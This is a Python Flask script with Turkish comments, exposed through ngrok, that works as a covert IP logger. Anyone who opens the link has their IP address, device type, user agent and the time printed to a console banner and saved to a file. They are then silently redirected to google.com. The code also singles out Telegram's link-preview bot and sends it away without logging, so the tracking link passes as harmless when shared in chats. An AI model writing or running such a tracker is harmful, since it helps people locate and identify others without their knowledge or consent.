#ngrok http 5000
from flask import Flask, request, redirect
from datetime import datetime

app = Flask(__name__)

LOG_FILE = "ip_loglari.txt"

@app.route('/')
def home():
    # Ngrok üzerinden gelen gerçek IP adresini ve tarayıcı bilgisini al
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', '')
    tarih = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Telegram botunun önizleme isteğini ayırt et
    if "TelegramBot" in user_agent:
        print(f"\n[ℹ️ TELEGRAM ÖNİZLEME] {tarih} - Link kontrol edildi.")
        return redirect("https://www.google.com", code=302)

    # Cihaz Türü Tespiti
    cihaz = "BİLİNMEYEN CİHAZ"
    if "iPhone" in user_agent or "iPad" in user_agent:
        cihaz = "📱 iPhone / iOS"
    elif "Android" in user_agent:
        cihaz = "📱 Android Telefon"
    elif "Windows" in user_agent:
        cihaz = "💻 Windows Bilgisayar"
    elif "Macintosh" in user_agent:
        cihaz = "💻 Mac Bilgisayar"

    # Ekrana basılacak çerçeveli uyarı
    print("\n" + "="*60)
    print("🚨🚨🚨 AHANDA BU IP GİRDİ BAĞLANDI! 🚨🚨🚨")
    print("="*60)
    print(f"📍 GERÇEK IP ADRESİ : {user_ip}")
    print(f"⏰ ZAMAN            : {tarih}")
    print(f"📱 CİHAZ TÜRÜ       : {cihaz}")
    print(f"🌐 TARAYICI DETAY   : {user_agent}")
    print("="*60 + "\n")

    # Dosyaya kaydet
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{tarih}] IP: {user_ip} | Cihaz: {cihaz} | UA: {user_agent}\n")
    except Exception as e:
        print(f"Log yazma hatası: {e}")

    # Temiz ve düzgün HTTP 302 Yönlendirmesi
    return redirect("https://www.google.com", code=302)

if __name__ == '__main__':
    print("\n🚀 IP TAKİP KONSOLU AKTİF! Dinleniyor...\n")
    # threaded=True ile eşzamanlı kilitlenmeler engellenir
    app.run(host='0.0.0.0', port=5000, threaded=True)
